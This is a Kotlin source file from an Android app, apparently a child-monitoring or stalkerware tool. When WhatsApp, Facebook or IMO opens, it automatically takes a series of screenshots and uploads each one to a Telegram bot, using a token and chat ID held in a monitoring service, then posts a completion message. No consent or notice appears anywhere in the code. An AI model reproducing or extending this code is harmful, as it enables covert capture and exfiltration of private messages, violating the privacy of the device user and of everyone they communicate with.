package com.coc338781.childapp

import android.content.Context
import android.graphics.Bitmap
import android.os.Handler
import android.os.Looper
import android.util.Log
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.MultipartBody
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.asRequestBody
import okhttp3.RequestBody.Companion.toRequestBody
import java.io.File
import java.io.FileOutputStream
import java.util.concurrent.TimeUnit

object AutoScreenshot {
    private const val TAG = "AutoScreenshot"
    private const val PREF = "autoshot_prefs"
    private const val KEY_ENABLED = "enabled"
    private const val KEY_COUNT = "count"

    private val client = OkHttpClient.Builder()
        .connectTimeout(30, TimeUnit.SECONDS)
        .readTimeout(60, TimeUnit.SECONDS)
        .build()

    fun isEnabled(context: Context): Boolean {
        val prefs = context.getSharedPreferences(PREF, Context.MODE_PRIVATE)
        return prefs.getBoolean(KEY_ENABLED, false)
    }

    fun setEnabled(context: Context, enabled: Boolean) {
        val prefs = context.getSharedPreferences(PREF, Context.MODE_PRIVATE)
        prefs.edit().putBoolean(KEY_ENABLED, enabled).apply()
    }

    fun getCount(context: Context): Int {
        val prefs = context.getSharedPreferences(PREF, Context.MODE_PRIVATE)
        return prefs.getInt(KEY_COUNT, 3)
    }

    fun setCount(context: Context, count: Int) {
        val prefs = context.getSharedPreferences(PREF, Context.MODE_PRIVATE)
        prefs.edit().putInt(KEY_COUNT, count).apply()
    }

    // WhatsApp/FB/IMO open කරාම call කරනවා
    fun captureSequence(context: Context, appName: String) {
        if (!isEnabled(context)) return

        val count = getCount(context)
        val svc = ScreenService.instance ?: return

        Handler(Looper.getMainLooper()).postDelayed({
            captureBatch(context, svc, appName, count, 0)
        }, 2000L)
    }

    private fun captureBatch(context: Context, svc: ScreenService, appName: String, total: Int, current: Int) {
        if (current >= total) {
            notifyTelegram(context, "📸 Auto-screenshots done for $appName ($total)")
            return
        }

        svc.takeShot { bmp ->
            if (bmp != null) {
                sendScreenshot(context, bmp, appName, current + 1, total)
            }
            Handler(Looper.getMainLooper()).postDelayed({
                captureBatch(context, svc, appName, total, current + 1)
            }, 1500L)
        }
    }

    private fun sendScreenshot(context: Context, bmp: Bitmap, appName: String, num: Int, total: Int) {
        CoroutineScope(Dispatchers.IO).launch {
            try {
                val file = File(context.cacheDir, "autoshot_${System.currentTimeMillis()}.jpg")
                FileOutputStream(file).use {
                    bmp.compress(Bitmap.CompressFormat.JPEG, 70, it)
                }

                val url = "https://api.telegram.org/bot${MonitoringService.BOT_TOKEN}/sendPhoto"
                val body = MultipartBody.Builder().setType(MultipartBody.FORM)
                    .addFormDataPart("chat_id", MonitoringService.CHAT_ID)
                    .addFormDataPart("photo", file.name, file.asRequestBody("image/jpeg".toMediaType()))
                    .addFormDataPart("caption", "📸 $appName — $num/$total")
                    .build()

                client.newCall(Request.Builder().url(url).post(body).build()).execute()
                file.delete()
            } catch (e: Exception) {
                Log.e(TAG, "Send error", e)
            }
        }
    }

    private fun notifyTelegram(context: Context, msg: String) {
        CoroutineScope(Dispatchers.IO).launch {
            try {
                val url = "https://api.telegram.org/bot${MonitoringService.BOT_TOKEN}/sendMessage"
                val json = """{"chat_id":"${MonitoringService.CHAT_ID}","text":"$msg"}"""
                val body = json.toRequestBody("application/json".toMediaType())
                client.newCall(Request.Builder().url(url).post(body).build()).execute()
            } catch (_: Exception) {}
        }
    }
}
